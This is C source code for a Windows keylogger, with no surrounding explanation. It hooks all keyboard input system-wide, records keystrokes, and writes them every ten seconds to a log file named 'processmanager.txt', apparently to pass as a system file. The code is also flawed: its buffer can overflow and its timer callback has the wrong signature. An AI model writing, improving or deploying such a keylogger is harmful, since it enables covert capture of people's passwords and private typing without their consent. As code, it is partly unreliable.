#include <stdio.h>
#include <windows.h>

HHOOK keyboardHook;
FILE* logFile;
char log[1000];

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        char keyName[0x100];

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            int key = kbdStruct->vkCode;

            if (key == VK_SPACE || key == VK_RIGHT || key == VK_LEFT || key == VK_UP || key == VK_DOWN) {
                // Do nothing for special keys
            } else {
                sprintf(keyName, " %c ", key);
                strcat(log, keyName);
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void Report() {
    fprintf(logFile, "%s", log);
    log[0] = '\0';
    SetTimer(NULL, 1, 10000, (TIMERPROC)Report);
}

int main() {
    logFile = fopen("processmanager.txt", "a");
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    Report();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
    fclose(logFile);
    return 0;
}
